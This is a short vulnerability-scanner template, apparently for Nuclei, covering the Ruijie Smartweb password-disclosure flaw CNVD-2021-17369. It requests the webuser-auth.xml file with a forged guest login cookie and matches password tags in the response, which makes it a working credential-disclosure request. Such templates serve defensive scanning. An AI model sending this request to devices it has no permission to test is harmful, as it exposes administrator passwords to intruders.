id: CNVD-2021-17369

info:
  name: 锐捷 Smartweb 管理系统密码信息泄露漏洞（CNVD-2021-17369）
  author: pikpikcu
  severity: high
  description: 锐捷 Smartweb 管理系统存在敏感凭据泄露风险，低权限或未授权访问可能获取管理员口令信息。模板通过读取 `web/xml/webuser-auth.xml` 并匹配 `password` 标签判断漏洞是否存在。
  reference:
    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: cnvd2021,cnvd,ruijie,disclosure,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/web/xml/webuser-auth.xml"

    headers:
      Cookie: login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<userauth>"
          - "<password>"
        condition: and

      - type: status
        status:
          - 200
